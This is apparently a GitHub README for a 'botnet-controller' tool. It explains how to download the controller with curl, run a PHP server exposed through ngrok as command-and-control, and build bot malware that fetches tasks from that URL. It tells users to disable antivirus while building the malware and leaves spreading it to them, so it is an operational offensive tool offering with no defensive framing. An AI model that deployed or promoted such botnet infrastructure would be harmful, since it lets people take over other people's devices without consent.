## What is a Botnet?

A botnet is a number of Internet-connected devices, each of which runs one (or more) bots.

For more info on what a botnet is please vist https://en.wikipedia.org/wiki/Botnet

## Features

Port forwarding is not required and hence server deployment time is quicker and easier

## Getting started?

- Download the compiled software for windows from [here](https://raw.githubusercontent.com/canosaur/botnet-controller/main/controller.exe) or run 
 ```
 curl -o controller.exe https://raw.githubusercontent.com/canosaur/botnet-controller/main/controller.exe
 ``` 
 in your terminal.
 To run the exe simply click on it or run it from terminal by typing its name.

- If you have python3 installed on your windows machine then you can download the python script from [here](http://raw.githubusercontent.com/canosaur/botnet-controller/main/controller.py) or run
```
curl -o controller.py http://raw.githubusercontent.com/canosaur/botnet-controller/main/controller.py
```
in your terminal
- Run the program, if this is the first time running it, it will download some packages.
- If you are an advance user and already have php, ngrok installed you can edit the source code accordingly and use it, but by default the program will
 itself download all the dependencies.
- You will need an ngrok account(free account will work too) to run the program, it can be done [here](https://dashboard.ngrok.com/signup)

## How?

botnet-controller uses php to host servers locally and uses ngrok to port forward. From there it then grabs the ngrok url and adds it in the botnet malware, which takes orders from the main server (your pc, or wherever the controller is running). The bots then requsts the url and do the task specified to them.

## Note
Shuting down the system will shutdown the server too and you will get a different ngrok URL on hosting the server again. Hence you will lose all the bots 
which use that specific URL as it would no longer be reachable. You will need to keep you device turned on, or if you really want to close it, try 
hibernating it.(it worked once but cannot be guranteed)
Its also recommended to turn off antivirus if you are building malware, or else the file might be deleted or sometimes get compilied improperly.

## Some additional notes
This software will only work for botnets generated by this software, spreading the malware is to be done by the user.
